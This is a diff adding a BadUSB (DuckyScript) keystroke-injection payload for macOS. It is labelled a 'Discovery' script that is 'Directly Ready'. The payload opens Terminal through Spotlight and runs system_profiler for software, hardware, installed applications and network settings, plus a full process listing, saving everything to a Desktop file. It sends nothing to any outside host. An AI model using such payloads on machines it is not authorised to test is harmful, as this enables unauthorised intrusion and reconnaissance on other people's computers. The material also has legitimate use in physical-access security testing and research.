@@ -1,0 +1,35 @@
+REM Title: macOS System Profiler
+REM Author: BadUSB Library
+REM Description: Gathers comprehensive system information
+REM Target: macOS 10.15+
+REM Category: Discovery
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Gather system information
+STRING system_profiler SPSoftwareDataType > ~/Desktop/system_info.txt
+ENTER
+DELAY 2000
+
+STRING system_profiler SPHardwareDataType >> ~/Desktop/system_info.txt
+ENTER
+DELAY 2000
+
+STRING system_profiler SPApplicationsDataType >> ~/Desktop/system_info.txt
+ENTER
+DELAY 2000
+
+STRING system_profiler SPNetworkDataType >> ~/Desktop/system_info.txt
+ENTER
+DELAY 2000
+
+STRING ps aux >> ~/Desktop/system_info.txt
+ENTER
+DELAY 2000
